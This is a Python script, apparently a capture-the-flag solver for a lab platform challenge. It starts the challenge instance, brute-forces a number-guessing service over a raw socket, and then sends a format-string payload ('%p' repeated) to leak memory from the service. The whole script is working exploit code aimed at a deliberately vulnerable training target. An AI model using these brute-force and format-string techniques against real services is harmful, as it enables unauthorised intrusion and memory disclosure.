import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        desc = d.get("description") or ""
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", desc)
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
if not host:
    raise SystemExit(1)

s = socket.create_connection((host, port), timeout=20)
s.settimeout(10)
time.sleep(0.5)
try:
    s.recv(65536)
except Exception:
    pass
found = None
for guess in range(1, 4097):
    s.sendall(f"{guess}\n".encode())
    time.sleep(0.003)
    try:
        s.settimeout(0.04)
        d = s.recv(65536)
        if b"New winner" in d or b"Congrats" in d:
            print("TROUVE:", guess)
            found = guess
            break
    except socket.timeout:
        continue
    except Exception:
        break
print("guess =", found)
if found:
    # passe de fuite : format string
    s.settimeout(5)
    try:
        s.recv(65536)
    except Exception:
        pass
    s.sendall(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
    time.sleep(0.8)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except Exception:
        pass
    print("LEAK:", out.decode("utf-8", "replace")[:600])
s.close()
